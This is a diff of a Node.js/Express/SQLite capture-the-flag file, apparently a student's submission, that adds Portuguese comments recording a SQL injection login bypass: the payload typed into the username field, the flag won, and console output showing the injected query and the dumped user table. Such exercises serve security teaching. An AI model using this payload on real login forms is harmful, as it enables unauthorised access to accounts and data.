@@ -1,6 +1,18 @@
 // CTF - SQL Injection no Login
 // Tecnologias: Node.js, Express, SQLite
 
+// Guilherme Dilio de Souza
+// Input usado para acessar o sistema: no campo username = abc' OR 1=1; -- no campo password = fdsfs
+// Flag: VULCOM{SQLi_Exploit_Success}
+// Mensagem no console:
+/*
+CONSULTA:  SELECT * FROM users WHERE username = 'abc' OR 1=1;' AND password = 'fdsfs'
+RESULTADO: [
+  { id: 1, username: 'admin', password: 'admin123' },
+  { id: 2, username: 'user', password: 'user123' }
+]
+*/
+
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const bodyParser = require('body-parser');
